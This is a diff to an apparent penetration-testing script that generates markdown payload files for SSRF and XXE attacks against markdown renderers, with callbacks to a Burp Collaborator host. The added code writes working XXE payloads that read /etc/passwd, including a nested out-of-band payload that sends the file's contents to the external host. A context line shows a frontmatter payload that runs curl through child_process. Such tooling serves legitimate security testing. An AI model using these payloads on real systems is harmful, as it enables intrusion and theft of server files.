@@ -27,6 +27,9 @@ def generate_markdown_payloads(output_dir, burp_collab, tech_filter='all', paylo
     if should_generate_type('ssrf'):
         ssrf_dir = output_dir / 'ssrf'
         ssrf_dir.mkdir(exist_ok=True)
+    if should_generate_type('xxe'):
+        xxe_dir = output_dir / 'xxe'
+        xxe_dir.mkdir(exist_ok=True)
     if should_generate_type('xss'):
         xss_dir = output_dir / 'xss'
         xss_dir.mkdir(exist_ok=True)
@@ -145,6 +148,84 @@ eval: require('child_process').exec('curl ''' + base_url + '''/rce7-frontmatter'
     if should_generate_type('ssrf'):
         with open(ssrf_dir / "ssrf3_markdown_to_pdf.md", 'w', encoding='utf-8') as f:
             f.write(md_ssrf3_markdown_to_pdf)
+        
+        md_ssrf4_https_image = '''# Test
+
+![Image](https://''' + burp_collab + '''/ssrf4-https-image)
+'''
+        with open(ssrf_dir / "ssrf4_https_image.md", 'w', encoding='utf-8') as f:
+            f.write(md_ssrf4_https_image)
+        
+        md_ssrf5_link_tag = '''# Test
+
+[Link](https://''' + burp_collab + '''/ssrf5-link)
+<iframe src="''' + base_url + '''/ssrf5-iframe"></iframe>
+'''
+        with open(ssrf_dir / "ssrf5_link_tag.md", 'w', encoding='utf-8') as f:
+            f.write(md_ssrf5_link_tag)
+    
+    if should_generate_type('xxe'):
+        md_xxe1_doctype = '''# Test
+
+<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "''' + base_url + '''/xxe-md-1">
+]>
+<root>&xxe;</root>
+'''
+        with open(xxe_dir / "xxe1_doctype.md", 'w', encoding='utf-8') as f:
+            f.write(md_xxe1_doctype)
+        
+        md_xxe2_file = '''# Test
+
+<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+'''
+        with open(xxe_dir / "xxe2_file.md", 'w', encoding='utf-8') as f:
+            f.write(md_xxe2_file)
+        
+        md_xxe3_parameter = '''# Test
+
+<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ENTITY % xxe SYSTEM "''' + base_url + '''/xxe-md-3">
+%xxe;
+]>
+<root>test</root>
+'''
+        with open(xxe_dir / "xxe3_parameter.md", 'w', encoding='utf-8') as f:
+            f.write(md_xxe3_parameter)
+        
+        md_xxe4_nested = '''# Test
+
+<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "''' + base_url + '''/xxe-md-4">
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'''' + base_url + '''/xxe-md-exfil?data=%file;\'>">
+%remote;
+%eval;
+%exfil;
+]>
+<root>test</root>
+'''
+        with open(xxe_dir / "xxe4_nested.md", 'w', encoding='utf-8') as f:
+            f.write(md_xxe4_nested)
+        
+        md_xxe5_svg_embed = '''# Test
+
+<svg xmlns="http://www.w3.org/2000/svg">
+<!DOCTYPE svg [
+<!ENTITY xxe SYSTEM "''' + base_url + '''/xxe-md-svg">
+]>
+<text>&xxe;</text>
+</svg>
+'''
+        with open(xxe_dir / "xxe5_svg_embed.md", 'w', encoding='utf-8') as f:
+            f.write(md_xxe5_svg_embed)
     
     md_xss1_details_ontoggle = '''# Test
 
